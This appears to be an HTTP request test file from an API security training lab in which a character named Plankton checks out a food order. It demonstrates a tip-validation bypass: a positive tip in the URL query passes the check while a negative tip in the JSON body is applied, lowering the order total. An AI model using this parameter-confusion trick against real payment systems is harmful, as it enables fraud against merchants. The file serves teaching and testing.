# @import ../common/setup.http
@host = {{base_host}}/v104

# Sandy added a new feature: now you can tip your courier!
# Plankton wonders what will happen if he tips a negative amount...

{{
  await seedBalance("v104", "plankton", 100);
}}


### Fetch menu to get item details
GET /menu

{{
  exports.coral_bits = response.parsedBody.find(i => i.name.includes("Coral"));
}}


### Plankton prepares a cart
# @name cart
POST /cart
Authorization: {{plankton_auth}}


POST /cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "{{coral_bits.id}}" }


### Plankton tries to put a negative tip in the JSON body
POST /cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "Chum Bucket"
}

// The server doesn't accept negative tips, so far so good...
HTTP/1.1 400 - BAD REQUEST
{
  "error": "tip cannot be negative"
}

?? status == 400


### Plankton tries to add a negative tip in the form body
POST /cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=-50&delivery_address=124 Conch Street

// This similarly doesn't work
HTTP/1.1 400 - BAD REQUEST
{
  "error": "tip cannot be negative"
}

?? status == 400


# --- Exploit: Plankton can bypass tip validation ---

### Plankton puts a positive tip in the URL but a negative tip in the request body
POST /cart/{{cart.cart_id}}/checkout?tip=20
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "tip": -50,
  "delivery_address": "Chum Bucket"
}

?? status == 201
?? js response.parsedBody.tip == -50
?? js response.parsedBody.total == {{parseFloat(coral_bits.price) + 5.00 - 50.00}}
